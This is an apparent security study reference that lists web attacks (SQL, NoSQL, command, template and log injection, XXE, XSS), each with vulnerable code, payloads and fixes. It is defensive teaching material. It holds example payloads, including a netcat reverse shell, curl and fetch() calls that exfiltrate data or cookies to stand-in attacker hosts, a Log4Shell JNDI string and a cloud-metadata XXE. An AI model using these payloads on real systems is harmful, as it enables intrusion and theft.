# Web Security Attacks — The Complete Reference

> **Classification:** Internal Engineering / Security Study Reference
> **Audience:** AppSec engineers, developers, pentesters, bug-bounty hunters, interview candidates
> **Scope:** Every major class of web application attack — mechanism, worked example with vulnerable and fixed code, variants, detection, and prevention
> **How to read this:** Each entry is self-contained. Skim the "What it is" line, study the code pair (vulnerable → fixed), then read the variants and detection notes. The document is ordered by family, not by severity.

---

## How to use this document

Every attack below follows the same skeleton so you can compare them:

- **What it is** — one or two sentences.
- **Mechanism** — why the vulnerability exists, at the level of what the machine actually does.
- **Vulnerable code** — a minimal example that has the bug.
- **The attack** — the exact payload or request, and what it produces.
- **Impact** — what an attacker gains.
- **The fix** — corrected code, plus the general principle.
- **Variants / detection / prevention** — where they add something.

Code is illustrative and language varies to match where each bug is most common. The principles transfer.

---

## The three ideas behind almost every web attack

Before the catalogue, three mental models. Nearly every entry below is a special case of one of these.

**1. Confusion between data and code.** The machine is handed a string that is *supposed* to be inert data (a name, a URL, a filename) and is instead interpreted as *instructions* (SQL, HTML, a shell command, a template). Every injection and XSS bug is this. The fix is always the same shape: keep data in a channel that cannot be reinterpreted as code — parameterised queries, contextual output encoding, argument arrays instead of shell strings.

**2. The confused deputy.** A privileged component is tricked into acting on behalf of an attacker because it cannot tell whose intent it is serving. CSRF (the browser is the deputy), SSRF (the server is the deputy), and clickjacking (the user is the deputy) are all this. The fix is to bind each action to a proof of *deliberate* intent from the right principal — tokens, `SameSite`, allowlists, re-authentication.

**3. Missing or wrong authorization.** The system checks *who you are* (authentication) but not *whether you may touch this specific object* (authorization). IDOR, path traversal, mass assignment, and privilege escalation are all this. The fix is an ownership or permission check at the point of every object access, written by hand, on every endpoint.

Keep these three in view. When you meet a new bug that is not in this document, it is almost certainly a new instance of one of them.

---

## Table of Contents

**Part A — Injection**
1. [SQL Injection](#1-sql-injection)
2. [NoSQL Injection](#2-nosql-injection)
3. [OS Command Injection](#3-os-command-injection)
4. [Code Injection (eval)](#4-code-injection-eval)
5. [LDAP Injection](#5-ldap-injection)
6. [XPath Injection](#6-xpath-injection)
7. [XML External Entities (XXE)](#7-xml-external-entities-xxe)
8. [Server-Side Template Injection (SSTI)](#8-server-side-template-injection-ssti)
9. [Expression Language / OGNL Injection](#9-expression-language--ognl-injection)
10. [CRLF Injection & HTTP Response Splitting](#10-crlf-injection--http-response-splitting)
11. [Host Header Injection](#11-host-header-injection)
12. [HTTP Parameter Pollution](#12-http-parameter-pollution)
13. [Email / SMTP Header Injection](#13-email--smtp-header-injection)
14. [Log Injection](#14-log-injection)

**Part B — Cross-Site Scripting**
15. [Reflected XSS](#15-reflected-xss)
16. [Stored XSS](#16-stored-xss)
17. [DOM-based XSS](#17-dom-based-xss)
18. [Mutation XSS (mXSS)](#18-mutation-xss-mxss)
19. [Blind XSS](#19-blind-xss)
20. [HTML Injection / Content Spoofing](#20-html-injection--content-spoofing)

**Part C — Request Forgery & Cross-Origin**
21. [Cross-Site Request Forgery (CSRF)](#21-cross-site-request-forgery-csrf)
22. [Server-Side Request Forgery (SSRF)](#22-server-side-request-forgery-ssrf)
23. [CORS Misconfiguration](#23-cors-misconfiguration)
24. [Clickjacking](#24-clickjacking)
25. [Cross-Site WebSocket Hijacking](#25-cross-site-websocket-hijacking)
26. [postMessage Vulnerabilities](#26-postmessage-vulnerabilities)
27. [Reverse Tabnabbing](#27-reverse-tabnabbing)
28. [Open Redirect](#28-open-redirect)
29. [Prototype Pollution](#29-prototype-pollution)

**Part D — Access Control & Authentication**
30. [Broken Access Control & IDOR](#30-broken-access-control--idor)
31. [Path Traversal / LFI / RFI](#31-path-traversal--lfi--rfi)
32. [Privilege Escalation](#32-privilege-escalation)
33. [Mass Assignment](#33-mass-assignment)
34. [Authentication Weaknesses](#34-authentication-weaknesses)
35. [Session Attacks](#35-session-attacks)
36. [JWT Attacks](#36-jwt-attacks)
37. [OAuth / OIDC Attacks](#37-oauth--oidc-attacks)

**Part E — Data, Files & Crypto**
38. [Insecure Deserialization](#38-insecure-deserialization)
39. [File Upload Vulnerabilities](#39-file-upload-vulnerabilities)
40. [Sensitive Data Exposure](#40-sensitive-data-exposure)
41. [Cryptographic Failures](#41-cryptographic-failures)

**Part F — Infrastructure & Protocol**
42. [HTTP Request Smuggling](#42-http-request-smuggling)
43. [Web Cache Poisoning](#43-web-cache-poisoning)
44. [Web Cache Deception](#44-web-cache-deception)
45. [Subdomain Takeover](#45-subdomain-takeover)
46. [DNS Rebinding](#46-dns-rebinding)
47. [Denial of Service (ReDoS, bombs, Slowloris)](#47-denial-of-service)

**Part G — Logic, Supply Chain & APIs**
48. [Business Logic Flaws](#48-business-logic-flaws)
49. [Race Conditions / TOCTOU](#49-race-conditions--toctou)
50. [Supply Chain Attacks](#50-supply-chain-attacks)
51. [GraphQL-Specific Attacks](#51-graphql-specific-attacks)
52. [Security Misconfiguration](#52-security-misconfiguration)

- [Appendix A — OWASP Top 10 (2021) mapping](#appendix-a--owasp-top-10-2021-mapping)
- [Appendix B — Defensive cheat sheet](#appendix-b--defensive-cheat-sheet)
- [Appendix C — Further Reading & External Resources](#appendix-c--further-reading--external-resources)

---

# Part A — Injection

Injection is the archetype of "data interpreted as code." A parser somewhere — SQL engine, shell, XML processor, template engine — receives a string that mixes trusted structure with untrusted input, and the untrusted part changes the structure. The universal fix is **separation**: send structure and data through different channels so the data can never become structure.

---

## 1. SQL Injection

**What it is:** Untrusted input is concatenated into a SQL query string, letting an attacker change the query's structure — reading, modifying, or destroying data, and sometimes executing OS commands.

**Mechanism:** The database receives one string and parses it into a query plan. It has no way to know which bytes came from the developer and which from the user. If the user's bytes contain SQL syntax (`'`, `--`, `UNION`, `;`), the parser honours them as instructions.

### Vulnerable code

```python
# Python — string interpolation into SQL. NEVER do this.
def get_user(username):
    query = f"SELECT id, email FROM users WHERE username = '{username}'"
    return db.execute(query).fetchone()
```

### The attack

```
username = alice' OR '1'='1
→ SELECT id, email FROM users WHERE username = 'alice' OR '1'='1'
  # returns every row — '1'='1' is always true

username = alice'--
→ SELECT id, email FROM users WHERE username = 'alice'--'
  # -- comments out the rest; auth bypass if this is a login check

username = '; DROP TABLE users;--
→ if the driver allows stacked queries, the table is gone
```

### Impact

Full read of the database (credentials, PII, payment data), authentication bypass, data modification, and — via features like PostgreSQL `COPY ... TO PROGRAM`, MSSQL `xp_cmdshell`, or writing web-shell files through `INTO OUTFILE` — remote code execution on the database host.

### The fix

```python
# Parameterised query. The driver sends the SQL structure and the
# parameter values over SEPARATE protocol fields. The value can never
# be reparsed as SQL, no matter what it contains.
def get_user(username):
    query = "SELECT id, email FROM users WHERE username = %s"
    return db.execute(query, (username,)).fetchone()
```

**The principle:** never build a query by string concatenation. Use parameterised queries / prepared statements everywhere. ORMs do this for you — but only if you avoid their raw-query escape hatches (`.raw()`, `.extra()`, string-built `WHERE` clauses).

### Variants — how attackers extract data when they cannot see it directly

| Variant | How it works | When it is used |
|---|---|---|
| **In-band / error-based** | The database's error messages echo query fragments or data | Verbose errors are shown to the user |
| **UNION-based** | `UNION SELECT` appends attacker-chosen columns to the result set | The query result is rendered on the page |
| **Blind boolean** | Inject a condition; infer true/false from whether the page changes | No data or errors are returned, but behaviour differs |
| **Blind time-based** | Inject `IF(condition, SLEEP(5), 0)`; measure response time | Nothing at all is returned or differs — only timing leaks |
| **Out-of-band** | Force the DB to make a DNS/HTTP request carrying the data | No in-response channel exists, but the DB has network egress |
| **Second-order** | Payload is stored safely, then later concatenated into a query elsewhere | Input is escaped on write but trusted on read |

```sql
-- UNION-based: discover column count, then exfiltrate
' UNION SELECT username, password_hash FROM users--

-- Blind boolean: is the first char of the admin's password 's'?
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s'--

-- Blind time-based: same question, inferred from a 5-second delay
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s', SLEEP(5), 0)--

-- Out-of-band (MSSQL): the DB resolves an attacker DNS name carrying data
';EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\a'--
```

**Second-order** deserves emphasis because it defeats naive escaping. Suppose registration escapes the username before storing it, so `o'brien` is stored correctly. Later, a "change password" feature reads that username *back out of the database* and concatenates it into a new query without re-escaping — because "it came from our own database, so it's trusted." The stored quote now breaks the second query. **Trust boundaries are per-operation, not per-datum.**

### Detection & prevention

- **Prevent:** parameterised queries, an ORM used correctly, least-privilege DB accounts (the web app's DB user should not own tables or have `FILE`/`xp_cmdshell`), and disabling stacked queries where the driver allows.
- **Detect:** a WAF flags SQL keywords and quotes in parameters; the database's own logs show syntax errors (probing produces them) and queries joining `information_schema` or system tables; sudden `SLEEP`/`BENCHMARK`/`pg_sleep` calls indicate time-based blind attempts.
- **Defence in depth:** parameterisation is the real control; a WAF is a speed bump. Input allowlisting (e.g. an ID must be a positive integer) shrinks the surface but is not a substitute.

---

## 2. NoSQL Injection

**What it is:** The same data-as-code confusion, against document stores like MongoDB. Because queries are often *objects* rather than strings, the injection frequently arrives as a nested object rather than a broken string.

**Mechanism:** Many web frameworks parse query strings and JSON bodies into rich types. `?username[$ne]=` becomes the object `{username: {$ne: ""}}`. If that object is passed straight into a MongoDB query, the attacker has injected a *query operator*, not a value.

### Vulnerable code

```javascript
// Express + MongoDB. req.body is parsed into arbitrary objects.
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password        // attacker-controlled TYPE, not just value
  });
  if (user) res.json({ token: issue(user) });
});
```

### The attack

```json
// Request body — password is an object, not a string
{ "username": "admin", "password": { "$ne": null } }

// The query becomes:
// { username: "admin", password: { $ne: null } }
// "find admin whose password is not null" → matches → auth bypass
```

Other operator injections: `{"$gt": ""}` (greater than empty — always true), `{"$regex": "^a"}` (blind extraction of a value character by character), and `$where` clauses that accept JavaScript and enable server-side code execution in older MongoDB setups.

### The fix

```javascript
// 1. Coerce to the expected type before querying.
// 2. Validate with a schema.
const username = String(req.body.username);
const password = String(req.body.password);   // an object stringifies to "[object Object]"

// Better: a schema validator that rejects non-string types outright
const { error, value } = loginSchema.validate(req.body);  // Joi/Zod
if (error) return res.status(400).json({ error: 'Invalid input' });
```

**The principle:** enforce the *type* of every input, not only its value. In dynamically typed languages, an attacker controlling a field's type is as dangerous as controlling its value.

### Prevention

- Cast inputs to primitives, or validate with a strict schema that rejects objects and arrays where scalars are expected.
- Disable the `$where` operator and server-side JavaScript in the database configuration.
- Use an ODM (Mongoose) with typed schemas — it coerces and rejects mismatches.

---

## 3. OS Command Injection

**What it is:** Untrusted input reaches a shell, letting the attacker append their own commands.

**Mechanism:** Functions like `system()`, `exec()`, `os.system()`, and `child_process.exec()` pass a *single string* to `/bin/sh -c`. The shell then interprets metacharacters — `;`, `|`, `&&`, `$(...)`, backticks, `>` — as command structure.

### Vulnerable code

```python
import os
# A "ping this host" diagnostics endpoint
def ping(host):
    os.system(f"ping -c 1 {host}")     # host goes to the shell verbatim
```

### The attack

```
host = 8.8.8.8; cat /etc/passwd
→ ping -c 1 8.8.8.8; cat /etc/passwd

host = 8.8.8.8 && curl http://attacker/$(whoami)
→ chains an outbound request carrying the current username

host = 8.8.8.8 | nc attacker 4444 -e /bin/sh
→ a reverse shell
```

### The fix

```python
import subprocess
# Pass an ARGUMENT ARRAY. No shell is invoked, so metacharacters are
# just literal characters in argv[1]. `; cat /etc/passwd` becomes a
# (nonsensical) hostname, not a second command.
def ping(host):
    subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5, check=True)
```

**The principle:** never build a shell command by concatenation. Use the array form of process-spawning APIs (`shell=False`), which bypasses the shell entirely. If you genuinely must call the shell, allowlist the input against a strict pattern (e.g. a valid hostname or IP) — but the array form is almost always available and always preferable.

### Variants

- **Argument injection:** even without a shell, passing attacker input as an argument can be dangerous if the program interprets leading `-` as flags. `curl "$url"` where `url = -o /etc/cron.d/x http://evil` writes a file. Mitigate with `--` to end option parsing, or validate the argument.
- **Blind command injection:** no output is returned. Confirm with time (`; sleep 10`) or out-of-band (`; nslookup unique.attacker.com`).

---

## 4. Code Injection (eval)

**What it is:** Untrusted input is passed to a language-level evaluator (`eval`, `exec`, `Function()`, `pickle`, template `eval` filters), executing attacker code in the application's own process.

**Mechanism:** `eval` compiles and runs its string argument as source code in the current scope. Any user data inside that string becomes program logic.

### Vulnerable code

```javascript
// A "calculator" endpoint
app.get('/calc', (req, res) => {
  const result = eval(req.query.expr);   // catastrophic
  res.json({ result });
});
```

### The attack

```
expr = require('child_process').execSync('id').toString()
expr = process.mainModule.require('fs').readFileSync('/etc/passwd')
```

This is full remote code execution — there is no partial version of it.

### The fix

```javascript
// Use a real parser for the actual task. For arithmetic, a math library
// with no access to the runtime; never the language's own evaluator.
const { evaluate } = require('mathjs');
app.get('/calc', (req, res) => {
  res.json({ result: evaluate(req.query.expr) });  // sandboxed grammar
});
```

**The principle:** `eval` on untrusted input is never acceptable. If you need to interpret a small language (arithmetic, filters, rules), use a purpose-built, sandboxed parser that cannot reach the host runtime.

---

## 5. LDAP Injection

**What it is:** Untrusted input is concatenated into an LDAP search filter, altering the directory query — often to bypass authentication or enumerate the directory.

**Mechanism:** LDAP filters use a prefix syntax with special characters `( ) & | * = \`. Unescaped input can inject filter logic.

### Vulnerable code

```java
// Authenticate by binding with a filter built from user input
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
NamingEnumeration results = ctx.search("ou=people,dc=corp,dc=com", filter, controls);
```

### The attack

```
username = *)(uid=*))(|(uid=*
→ (&(uid=*)(uid=*))(|(uid=*)(userPassword=...))
  # the filter now matches all users; auth may succeed with any password

username = admin)(&))
password = anything
→ the password clause is neutralised; bind as admin
```

### The fix

```java
// Escape every special character per RFC 4515 before building the filter,
// or use a library that parameterises filter assertions.
String safe = LdapEncoder.filterEncode(username);   // e.g. Spring Security's encoder
String filter = "(&(uid=" + safe + ")(userPassword=" + LdapEncoder.filterEncode(password) + "))";
```

**The principle:** escape input for the LDAP filter grammar, or use a filter-building API that treats assertions as data. Better still, do not put the password in the filter at all — search for the DN by username, then attempt a *bind* with that DN and the password, letting the directory server verify credentials.

---

## 6. XPath Injection

**What it is:** The LDAP-shaped bug against XML documents queried with XPath. Unescaped input alters the XPath expression.

### Vulnerable code

```python
# Authenticate against an XML user store
expr = f"/users/user[username='{username}' and password='{password}']"
node = tree.xpath(expr)
```

### The attack

```
username = admin' or '1'='1
→ /users/user[username='admin' or '1'='1' and password='...']
  # returns a user regardless of password
```

### The fix

```python
# Use variables (parameterised XPath) rather than string building.
expr = "/users/user[username=$u and password=$p]"
node = tree.xpath(expr, u=username, p=password)   # lxml supports variables
```

**The principle:** identical to SQL and LDAP — separate the query structure from the data. Where a variable-binding XPath API is unavailable, escape quotes and expression metacharacters.

---

## 7. XML External Entities (XXE)

**What it is:** An XML parser configured to resolve external entities is fed attacker XML, which declares an entity pointing at a local file or internal URL. Parsing then discloses files or triggers SSRF.

**Mechanism:** XML's DTD feature lets a document define entities, including *external* ones that the parser fetches. A permissive parser will read `file:///etc/passwd` or `http://169.254.169.254/...` and substitute the contents into the document.

### The attack

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
<!-- If the app echoes <data> back, /etc/passwd is disclosed. -->
```

```xml
<!-- SSRF into the cloud metadata service -->
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>&xxe;</data>

<!-- Blind / out-of-band exfiltration via a parameter entity and an external DTD -->
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;
]>
```

**Billion Laughs** is a denial-of-service cousin: nested entities that expand exponentially (`&lol9;` referencing ten `&lol8;` each) and exhaust memory.

### Vulnerable vs fixed

```java
// VULNERABLE — default parsers in many languages resolve external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// FIXED — disable DTDs entirely (the safest single switch)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**The principle:** disable DTD processing and external entity resolution on every XML parser. If the format does not need DTDs (almost none do), `disallow-doctype-decl` closes XXE and Billion Laughs at once. This also affects anything that parses XML under the hood: SVG upload processors, SOAP endpoints, SAML consumers, DOCX/XLSX parsers.

---

## 8. Server-Side Template Injection (SSTI)

**What it is:** Untrusted input is embedded into a server-side template that is then evaluated, letting the attacker run template expressions — which frequently escalate to full RCE.

**Mechanism:** Template engines (Jinja2, Twig, Freemarker, Velocity, ERB) evaluate `{{ ... }}` / `${ ... }` expressions with access to application objects. If user input is *concatenated into the template source* rather than passed as a *value to a fixed template*, the attacker's input is evaluated as a template expression.

### Vulnerable code

```python
from jinja2 import Template
# Building the template FROM user input — the bug
def greet(name):
    return Template("Hello " + name).render()
```

### The attack

```
name = {{7*7}}
→ renders "Hello 49"   # confirms SSTI

name = {{ ''.__class__.__mro__[1].__subclasses__() }}
→ walks Python's object graph to reach os/subprocess and execute commands

# Twig / PHP
name = {{ ['id']|filter('system') }}
```

### The fix

```python
# Pass user input as a VALUE to a fixed, developer-controlled template.
def greet(name):
    return Template("Hello {{ name }}").render(name=name)   # name is data, not template
```

**The principle:** the template string must be a constant the developer wrote; user input is only ever a *context variable*. Never concatenate user input into template source. Detect SSTI by injecting `{{7*7}}`, `${7*7}`, `#{7*7}` and looking for `49` in the response — the syntax that evaluates tells you the engine.

---

## 9. Expression Language / OGNL Injection

**What it is:** A specialised SSTI against Java expression languages (OGNL in Struts, SpEL in Spring, MVEL). Historically the root of catastrophic RCEs — Struts2 / Equifax (CVE-2017-5638) among them.

**Mechanism:** Frameworks evaluate expression-language strings with access to the full JVM. If attacker input reaches an EL evaluator — sometimes via a crafted `Content-Type` header, as in the Struts case — it runs Java.

### The attack (shape)

```
# Struts2 (CVE-2017-5638): payload in the Content-Type header
Content-Type: %{(#_='multipart/form-data')...(#cmd='id')...@java.lang.Runtime@getRuntime().exec(#cmd)...}
```

### The fix / principle

Keep framework and libraries patched — these are usually *library* bugs, not code you wrote. Never pass user input into `ExpressionParser.parseExpression()` (SpEL) or equivalent. Where a framework evaluates EL from request data, upgrade past the fix and apply the vendor's hardening flags.

---

## 10. CRLF Injection & HTTP Response Splitting

**What it is:** Untrusted input containing carriage-return/line-feed (`\r\n`) is written into an HTTP header, letting the attacker inject new headers or split the response into two.

**Mechanism:** HTTP headers are delimited by `\r\n`. If user input is placed into a header value unescaped and contains `\r\n`, the attacker terminates the current header and adds their own — or terminates the headers entirely and injects a body.

### Vulnerable code

```python
# Reflecting a parameter into a redirect header
resp.headers["Location"] = "/redirect?to=" + request.args["to"]
```

### The attack

```
to = /home%0d%0aSet-Cookie:%20session=attacker_fixed_value
→ injects a Set-Cookie header (session fixation)

to = /home%0d%0a%0d%0a<script>alert(1)</script>
→ splits the response; the injected body may be treated as HTML (reflected XSS)
```

### The fix

```python
# Strip or reject CR/LF, and use framework redirect helpers that encode.
target = request.args["to"]
if "\r" in target or "\n" in target:
    abort(400)
return redirect(url_for("home"))   # framework handles safe header construction
```

**The principle:** never place raw user input into a header. Strip control characters, and prefer framework APIs that construct headers safely. Modern servers reject bare CR/LF in header values, which has largely closed classic response splitting — but header *injection* (adding one header) still appears in hand-rolled header code.

---

## 11. Host Header Injection

**What it is:** The application trusts the client-supplied `Host` header (or `X-Forwarded-Host`) and uses it to build absolute URLs, cache keys, or password-reset links — letting an attacker poison those.

**Mechanism:** The `Host` header is attacker-controlled. Code that does `"https://" + request.host + "/reset?token=..."` builds a link pointing wherever the attacker says.

### The attack

```
POST /password-reset
Host: attacker.com
{ "email": "victim@example.com" }

# The reset email contains: https://attacker.com/reset?token=SECRET
# The victim clicks; the token is delivered to the attacker.
```

Other impacts: web cache poisoning (the poisoned absolute URL is cached and served to others), and routing to the wrong virtual host.

### The fix

```python
# Never trust the Host header for security-relevant URLs.
# Use a configured, canonical domain.
BASE_URL = "https://app.example.com"   # from config, not from the request
reset_link = f"{BASE_URL}/reset?token={token}"

# And validate Host against an allowlist at the edge:
ALLOWED_HOSTS = {"app.example.com"}
if request.host not in ALLOWED_HOSTS:
    abort(400)
```

**The principle:** the `Host` header is untrusted input. Absolute URLs in emails, redirects, and cache keys must come from server configuration, and the server should reject requests whose `Host` is not in an allowlist.

---

## 12. HTTP Parameter Pollution

**What it is:** Supplying the same parameter multiple times (`?role=user&role=admin`) exploits inconsistent handling across layers — the WAF sees one value, the application another.

**Mechanism:** HTTP does not define how duplicate parameters are handled. PHP takes the last, ASP.NET concatenates with commas, others take the first. When a WAF and the backend disagree, a payload can slip past the WAF while reaching the app in its dangerous form.

### The attack

```
# WAF inspects the first `q`, app uses the last (or vice versa)
/search?q=safe&q=' OR '1'='1

# Authorization confusion
/transfer?amount=100&amount=100000
```

### The fix

Normalise parameters early: reject duplicate parameters, or explicitly choose first/last and enforce it consistently through the whole stack. Frameworks and WAFs should be configured to agree on duplicate handling. Validate that a parameter appears exactly once where that matters.

---

## 13. Email / SMTP Header Injection

**What it is:** The CRLF-injection idea applied to email. User input in an email field (subject, name, a "send to a friend" recipient) containing `\r\n` injects additional SMTP headers — extra `Bcc:` recipients, a spoofed `From:`, or an entirely new message body.

### Vulnerable code

```php
// Contact form
$headers = "From: " . $_POST['email'] . "\r\n";
mail("support@example.com", $subject, $body, $headers);
```

### The attack

```
email = attacker@evil.com%0d%0aBcc:everyone@victim.com%0d%0aSubject:Spam
→ injects a Bcc header, turning the contact form into a spam relay
```

### The fix

Strip CR/LF from all header-bound fields, validate email addresses strictly, and use a mail library that separates envelope fields from content (parameterised recipients/subject) rather than building the raw header block by hand.

---

## 14. Log Injection

**What it is:** Unsanitised input written to logs, letting an attacker forge log entries, break log parsers, or — in the Log4Shell class — trigger code execution *from within the logging call*.

**Mechanism:** Two levels. Simple: newlines in input create fake log lines, hiding or fabricating events. Severe: a logging library that evaluates lookup syntax in log messages (Log4j's `${jndi:ldap://...}`, CVE-2021-44228) fetches and executes remote code when it *logs attacker input*.

### The attack

```
# Simple forgery — a User-Agent containing a newline
User-Agent: Mozilla\n2026-01-01 ADMIN logged in successfully

# Log4Shell — a header value that the server logs
User-Agent: ${jndi:ldap://attacker.com/a}
→ Log4j resolves the JNDI lookup, loads a remote class, executes it
```

### The fix

- Neutralise control characters (encode `\r\n`) before writing user data to logs; prefer structured logging (JSON) where values are fields, not free text.
- Keep logging libraries patched; disable message lookups (Log4j `formatMsgNoLookups=true` / upgrade).
- Treat logs as untrusted when *reading* them back into any parser or dashboard.

---
# Part B — Cross-Site Scripting (XSS)

XSS is the data-as-code confusion aimed at the *browser*. Attacker-controlled data is placed into a page such that the browser interprets it as HTML or JavaScript, running attacker code in the victim's session, on the application's origin. Because it runs on the origin, it can read anything the user can, make authenticated requests, and steal non-`HttpOnly` cookies.

The three classic types differ in *where the untrusted data enters and where it lands*:

- **Reflected** — data comes in on the request and is echoed straight back in the response.
- **Stored** — data is saved server-side and served to other users later.
- **DOM-based** — data never touches the server's HTML; client-side JavaScript writes it into the page.

The single most important defence across all of them is **context-aware output encoding**: encode data for the exact place it is inserted (HTML body, attribute, JavaScript string, URL, CSS), plus a Content Security Policy as a backstop.

---

## 15. Reflected XSS

**What it is:** User input in a request is reflected into the immediate response without encoding, so a crafted link executes script in the victim's browser.

### Vulnerable code

```javascript
// Express — echoing a search term into HTML
app.get('/search', (req, res) => {
  res.send(`<h1>Results for ${req.query.q}</h1>`);   // q is not encoded
});
```

### The attack

```
https://app.example.com/search?q=<script>fetch('https://attacker/c?'+document.cookie)</script>

# The attacker emails/messages this link to a victim. When clicked,
# the script runs on app.example.com and exfiltrates the session cookie
# (if not HttpOnly) or performs authenticated actions.
```

### The fix

```javascript
// Context-aware HTML encoding: < > & " ' become entities.
const escapeHtml = s => s.replace(/[&<>"']/g, c => ({
  '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
}[c]));
app.get('/search', (req, res) => {
  res.send(`<h1>Results for ${escapeHtml(String(req.query.q))}</h1>`);
});
```

**The principle:** encode on output, for the context. In practice, use a template engine with auto-escaping on (React, Angular, Jinja2 with autoescape, Razor) so this happens by default — and understand exactly which constructs bypass it.

---

## 16. Stored XSS

**What it is:** The payload is persisted (a comment, profile bio, product review, support ticket) and executes in the browser of *every* user who later views it. More dangerous than reflected because it needs no per-victim delivery and can hit administrators viewing a dashboard.

### Vulnerable code

```javascript
// Save a comment, then render it raw for every viewer
app.post('/comment', (req, res) => { saveComment(req.body.text); });
app.get('/thread', (req, res) => {
  const html = comments.map(c => `<div class="c">${c.text}</div>`).join('');
  res.send(html);   // stored payload executes for all viewers
});
```

### The attack

```html
<!-- Posted once as a comment -->
<img src=x onerror="fetch('https://attacker/steal?c='+document.cookie)">

<!-- A worm: payload that re-posts itself, as in the 2005 Samy MySpace worm,
     which added a million friends in 20 hours by self-propagating stored XSS -->
```

### The fix

Encode on output (as in reflected XSS) **and**, if you must allow *some* HTML (rich text), run it through a vetted sanitiser with an allowlist:

```javascript
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(c.text, { ALLOWED_TAGS: ['b','i','em','a'], ALLOWED_ATTR: ['href'] });
```

**The principle:** never render stored user content as raw HTML. Encode by default; for rich text, sanitise with an allowlist library (DOMPurify, OWASP Java HTML Sanitizer) — never with a hand-written blocklist, which always misses a bypass.

---

## 17. DOM-based XSS

**What it is:** The vulnerability is entirely client-side. JavaScript reads attacker-controlled data from a *source* (`location.hash`, `location.search`, `document.referrer`, `postMessage`) and writes it to a dangerous *sink* (`innerHTML`, `document.write`, `eval`, `setAttribute`) without encoding. The server may never see the payload — especially if it is in the URL fragment.

### Vulnerable code

```javascript
// Read a name from the URL fragment and display it
const name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').innerHTML = 'Hi ' + name;   // innerHTML is the sink
```

### The attack

```
https://app.example.com/#<img src=x onerror=alert(document.cookie)>

# The payload is in the fragment (#...), which the browser NEVER sends to
# the server. Server-side WAFs and logs see nothing. innerHTML parses and
# runs it.
```

### The fix

```javascript
// Use a sink that treats the value as text, not markup.
document.getElementById('greeting').textContent = 'Hi ' + name;

// If you must build HTML, sanitise first:
el.innerHTML = DOMPurify.sanitize('Hi ' + name);
```

**The principle:** map every *source* to every *sink* and ensure no untrusted source reaches a dangerous sink unencoded. Prefer safe sinks (`textContent`, `.setAttribute` for non-URL attributes) over `innerHTML`/`document.write`. **Trusted Types** (a browser feature) can enforce this at runtime by refusing raw strings at dangerous sinks.

### Common sources and sinks

| Sources (untrusted) | Dangerous sinks |
|---|---|
| `location.href / .search / .hash` | `innerHTML`, `outerHTML` |
| `document.referrer` | `document.write()`, `document.writeln()` |
| `window.name` | `eval()`, `setTimeout(string)`, `Function()` |
| `postMessage` event data | `element.setAttribute('href'/'src', ...)` |
| `localStorage` / `sessionStorage` | jQuery `$(...).html()`, `$(location.hash)` |

---

## 18. Mutation XSS (mXSS)

**What it is:** A payload that is *safe as written* becomes dangerous after the browser's HTML parser "fixes up" (mutates) the markup — bypassing sanitisers that inspected the pre-mutation string.

**Mechanism:** When you set `innerHTML`, the browser re-serialises and re-parses the DOM, and its error-correction can transform benign-looking markup into an executing payload. A sanitiser that ran on the *input* string never saw the mutated result. Historically this broke DOMPurify and many others via constructs inside `<template>`, `<svg>`, `<math>`, and mis-nested tags.

### The shape

```html
<!-- Looks inert to a naive sanitiser; the parser mutates it into active markup -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### The fix / principle

Use a current, well-maintained sanitiser (DOMPurify) that is specifically hardened against known mXSS vectors and re-serialises to check its own output. Keep it updated — mXSS is an arms race. Do not write your own HTML sanitiser. Where possible, avoid `innerHTML` entirely so there is no mutation step.

---

## 19. Blind XSS

**What it is:** Stored XSS whose payload fires in a context the attacker cannot see — an internal admin panel, a log viewer, a support-ticket dashboard, a CRM. The attacker plants it and waits for a privileged user to trigger it.

**Mechanism:** The attacker submits a payload in a field that will later be viewed by staff (a user-agent string, a support message, a delivery address). It executes in the staff member's browser, on an internal origin, often with high privilege.

### The attack

```html
<!-- Submitted in any field that staff later view in an internal tool -->
<script src="https://attacker.com/xss.js"></script>

<!-- The external script "phones home" with the URL, cookies, and DOM of
     wherever it fired, revealing the internal admin panel to the attacker.
     Tools like XSS Hunter automate this callback. -->
```

### The fix / principle

The defence is the same as stored XSS — encode and sanitise everywhere — but the lesson is *coverage*: internal and administrative interfaces need the same output encoding as public ones, because that is exactly where blind XSS lands. Never assume an internal tool is safe because "only staff use it."

---

## 20. HTML Injection / Content Spoofing

**What it is:** Injecting HTML that does not execute script but manipulates the page — fake login forms, misleading text, defacement, or CSS that exfiltrates data.

**Mechanism:** Even when scripts are blocked (by CSP or sanitisation), raw HTML injection lets an attacker add a `<form>` posting to their server, an `<a>` overlay, or `<style>` that leaks form values via attribute-selector background requests.

### The attack

```html
<!-- Injected into a page; a convincing fake login overlay -->
<form action="https://attacker.com/phish" method="post">
  <h2>Session expired — please sign in</h2>
  Email: <input name="e"> Password: <input name="p" type="password">
  <button>Sign in</button>
</form>

<!-- CSS-only data theft: leak a CSRF token character by character -->
input[value^="a"] { background: url(https://attacker/a); }
```

### The fix / principle

The same output encoding that stops XSS stops HTML injection. A strong CSP limits what injected markup can *do* (no external form posts if `form-action 'self'`; no external images if `img-src 'self'`). Treat "it's only HTML, not script" as still-exploitable.

---

# Part C — Request Forgery & Cross-Origin Attacks

